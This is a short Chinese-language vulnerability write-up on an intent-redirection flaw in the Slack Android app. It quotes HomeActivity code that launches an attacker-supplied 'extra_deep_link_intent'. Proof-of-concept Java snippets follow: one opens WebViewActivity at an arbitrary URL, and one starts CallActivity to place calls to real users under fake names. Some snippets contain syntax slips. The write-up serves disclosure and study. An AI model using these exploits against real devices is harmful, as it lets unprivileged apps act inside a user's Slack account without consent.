# 组件-Slack
恶意和无权限的本地应用可以以非intent的方式与Slack安卓app中任意activity进行交互。

'''com.Slack.ui.HomeActivity
protected void onResume() {
    // ...
    handleIntentExtras(getIntent()); // attacker can pass anything to getIntent()
}

private void handleIntentExtras(Intent intent) {
    // ...
    Intent deeplinkIntent = (Intent) intent.getParcelableExtra("extra_deep_link_intent");
    //  ...
    if (!(deeplinkIntent == null || this.consumedDeeplinkIntent)) {
        // ...
        startActivity(deeplinkIntent); // danger! starting an intent provided by an attacker
        // ...
    }
    // ...
}
'''

'''PoC
Intent next = new Intent();
next.setClassName("com.Slack","com.Slack.ui.WebViewActivity");
next.putExtra("extra_url","http://ya.ru");
next.putExtra("extra_title","test");

Intent start = new Intent();
start.setClassName("com.Slack","com.Slack.ui.HomeActivity");
start.putExtra("extra_deep_link_intent",next),

startActivity(start);
'''

1. Making calls to real people
'''
    Intent next = new Intent("create");
    next.setClassName = ("com.Slack","com.Slack.ui.CallActivity");
    next.putExtra("EXTRA_CALL_NAME","Fake call name");
    next.putExtra("EXTRA_CALLER_ID", "U1RFBBPCP");
    next.putExtra("EXTRA_CHANNEL_NAME", "Fake channel name");
    next.putExtra("EXTRA_CHANNEL_ID", "D2B84FUFQ");
    next.putExtra("EXTRA_USERS_TO_INVITE", new ArrayList<String>(Arrays.asList(new String[] { "U2B81JBAL" })));

    Intent start = new Intent();
    start.setClassName("com.Slack", "com.Slack.ui.HomeActivity");
    start.putExtra("extra_deep_link_intent", next);

    startActivity(start);
'''